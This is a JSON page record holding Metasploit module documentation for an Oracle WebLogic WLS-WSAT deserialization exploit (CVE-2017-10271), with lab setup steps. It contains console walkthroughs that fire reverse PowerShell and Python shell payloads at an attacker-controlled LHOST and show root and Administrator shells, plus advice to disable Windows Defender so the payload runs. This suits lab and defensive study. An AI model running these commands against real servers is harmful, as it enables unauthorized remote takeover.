{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/oracle_weblogic_wsat_deserialization_rce","result":{"data":{"moduleMetadataJson":{"id":"2991b6ea-14ef-5eb5-a592-7688ba0bbe70","name":"Oracle WebLogic wls-wsat Component Deserialization RCE","fullname":"exploit/multi/http/oracle_weblogic_wsat_deserialization_rce","description":"The Oracle WebLogic WLS WSAT Component is vulnerable to a XML Deserialization\n        remote code execution vulnerability. Supported versions that are affected are\n        10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Discovered by Alexey Tyurin\n        of ERPScan and Federico Dotta of Media Service. Please note that SRVHOST, SRVPORT,\n        HTTP_DELAY, URIPATH and related HTTP Server variables are only used when executing a check\n        and will not be used when executing the exploit itself.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/oracle_weblogic_wsat_deserialization_rce","documentationSlug":"/modules/documentation/exploit/multi/http/oracle_weblogic_wsat_deserialization_rce"},"documentation":{"html":"<h1 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h1>\n<p>This module works leverages <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-10271\">CVE-2017-10271</a> against Oracle WebLogic Server's  Web Service Atomic Transaction API a XML SOAP request to create a <code class=\"language-text\">java.lang.ProcessBuilder</code> object to provide unauthenticated arbitrary command execution.  A command line can be acquired through the use of <code class=\"language-text\">cmd/unix/reverse_python</code>.</p>\n<p>Note that the TARGET must be set to match either a Windows or Unix-based host.  If the TARGET variable is set improperly, a log entry will be generated on a vulnerable server, but the server will not crash.  For example, a Linux payload sent to a Windows server will output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">java.io.IOException: Cannot run program &quot;/bin/sh&quot;: CreateProcess error=2, The system cannot find the file specified\nContinuing ...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Oracle WebLogic server versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0 with access to Web Services Atomic Transaction (WS-AT) endpoints are vulnerable to unauthenticated arbitrary command execution.</p>\n<h3 id=\"windows-setting-up-a-vulnerable-application\" style=\"position:relative;\"><a href=\"#windows-setting-up-a-vulnerable-application\" aria-label=\"windows setting up a vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows: Setting up a vulnerable application</h3>\n<p>We successfully tested this exploit against a fully-patched, Windows 10 (x64) target.  Since WebLogic is resource intensive, consider providing four cores and 8GB of RAM.</p>\n<ol>\n<li><a href=\"http://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-main-097127.html\">Download</a> Oracle WebLogic Server 10.3.6, using the \"Windows x86 with 32-bit JVM\" (<code class=\"language-text\">wls1036_win32.exe</code>).</li>\n<li>Run the installer.  (See [here] for detailed instructions.)  You may be prompted to install a Java Development Kit (JDK).  <a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\">JDK 8u151 x64</a> was verified working.</li>\n<li>Windows Defender will block the payload from executing, so you may need to <a href=\"https://support.microsoft.com/en-us/help/4027187/windows-turn-off-windows-defender-antivirus\">temporarily</a> or <a href=\"https://www.windowscentral.com/how-permanently-disable-windows-defender-windows-10\">permanently</a> disable it.</li>\n<li>Run the configuration wizard and <a href=\"https://docs.oracle.com/cd/E29542_01/web.1111/e14140/newdom.htm#WLDCW192\">create a new weblogic domain</a>.  Domain names and credentials are irrelevant.  At the conclusion of the wizard, click \"Start Admin Server\".</li>\n<li>\n<p>The <code class=\"language-text\">startWebLogic.cmd</code> should run immediately after the installer and present logging output.  Once running, the window should output a line similar to the following</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&lt;Jan 11, 2018 1:30:49 PM CST&gt; &lt;Notice&gt; &lt;WebLogicServer&gt; &lt;BEA-000365&gt; &lt;Server state changed to RUNNING&gt;\n&lt;Jan 11, 2018 1:30:49 PM CST&gt; &lt;Notice&gt; &lt;WebLogicServer&gt; &lt;BEA-000360&gt; &lt;Server started in RUNNING mode&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"windows-attacking-a-vulnerable-application\" style=\"position:relative;\"><a href=\"#windows-attacking-a-vulnerable-application\" aria-label=\"windows attacking a vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows: Attacking a vulnerable application</h3>\n<p>Attack the above Windows server using the <code class=\"language-text\">exploit/multi/http/oracle_weblogic_wsat_deserialization_rce</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set RHOST [IP address of your target]\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set TARGET 0\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set PAYLOAD cmd/windows/reverse_powershell\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set LHOST [IP address of your attacker]\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; run\n\n[*] Started reverse TCP handler on 192.168.108.1:4444\n[*] Command shell session 1 opened (192.168.108.1:4444 -&gt; 192.168.108.132:50060) at 2018-01-11 11:48:16 -0600\n\nMicrosoft Windows [Version 10.0.16299.192]\n(c) 2017 Microsoft Corporation. All rights reserved.\n\nC:\\Oracle\\Middleware\\user_projects\\domains\\admindomain&gt;whoami\nweblogic-server\\Administrator</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"unix-setting-up-a-vulnerable-environment\" style=\"position:relative;\"><a href=\"#unix-setting-up-a-vulnerable-environment\" aria-label=\"unix setting up a vulnerable environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unix: Setting up a vulnerable environment</h3>\n<ol>\n<li>If necessary, install Docker.io.  <a href=\"https://www.ptrace-security.com/2017/06/14/how-to-install-docker-on-kali-linux-2017-1/\">These instructions</a> were tested on a Kali 2017.3 VM:</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D\necho &#39;deb https://apt.dockerproject.org/repo debian-stretch main&#39; &gt; /etc/apt/sources.list.d/docker.list\napt update\napt-get install docker-engine\nservice docker start\ndocker run hello-world</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"2\">\n<li>\n<p>Install a container running Ubuntu 16.04 and WebLogic 10.3.6.0:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">docker run -d -p7001:7001 -p80:7001 kkirsche/cve-2017-10271</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Confirm that the container is up.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">docker ps</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"unix-attacking-a-vulnerable-application\" style=\"position:relative;\"><a href=\"#unix-attacking-a-vulnerable-application\" aria-label=\"unix attacking a vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Unix: Attacking a vulnerable application</h3>\n<p>Attack the above Unix server using the <code class=\"language-text\">exploit/multi/http/oracle_weblogic_wsat_deserialization_rce</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set RHOST [IP address of the target]\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set TARGET 1\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set PAYLOAD cmd/unix/reverse_python\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; set LHOST [IP address of the attacker]\nmsf exploit(multi/http/oracle_weblogic_wsat_deserialization_rce) &gt; run\n\n[*] Started reverse TCP handler on 192.168.108.1:4444\n[*] Command shell session 5 opened (192.168.108.1:4444 -&gt; 192.168.108.129:51312) at 2018-01-11 11:46:49 -0600\n\nid\nuid=0(root) gid=0(root) groups=0(root)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h1 id=\"credits\" style=\"position:relative;\"><a href=\"#credits\" aria-label=\"credits permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Credits</h1>\n<p>Documentation originally written by Aaron Soto (@asoto-r7) and was edited by Kevin Kirsche (@kkirsche).</p>"}}},"pageContext":{"id":"2991b6ea-14ef-5eb5-a592-7688ba0bbe70"}}}